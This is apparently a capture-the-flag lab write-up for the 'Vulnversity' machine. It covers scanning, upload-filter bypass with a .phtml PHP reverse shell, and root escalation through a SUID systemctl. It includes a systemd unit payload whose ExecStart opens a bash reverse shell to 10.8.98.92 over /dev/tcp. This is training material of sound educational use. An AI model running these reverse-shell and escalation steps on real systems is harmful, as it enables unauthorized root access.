# Vulnversity

* Scan with *nmap*
* Find an website running on port 3333
* Locate dirs with gobuster, finding the /internal directory
* File inclusion vulnerability
* Find  which extensions are allowed using burp (editing the request and providing different extensions)
* The site does not accept neither php, php3, php4 or php5 extensions
* It does accept phtml, now we have a normal file inclusion vuln

## Getting a PHP reverse shell
* The code for the shell [PHP-shell](https://github.com/pentestmonkey/php-reverse-shell)
* Upload the file containing this code with the correct extension (phtml), then go to internal unploads, while having a netcan listening `nc -lvnp 1234`
* We have a shell
* We have to exploit a /bin/systemctl with the SUID bit set
* We insert the following payload:
```bash
$ cd /bin
$ 
$ touch /tmp/root.service
$ echo '[Unit]' > /tmp/root.service
$ echo 'Description=rooooot' >> /tmp/root.service
$ echo '[Service]' >> /tmp/root.service
$ echo 'Type=simple' >> /tmp/root.service
$ echo 'User=root' >> /tmp/root.service
$ echo "ExecStart=/bin/bash -c 'bash -i  >& /dev/tcp/10.8.98.92/3334 0>&1' " >> /tmp/root.service
$ echo '[Install]' >> /tmp/root.service
$ echo 'WantedBy=multi-user.target' >> /tmp/root.service
$ ./systemctl enable /tmp/root.service
$ ./systemctl start root
```
* Run the last command while having a netcat listener on the specified port to get the root shell
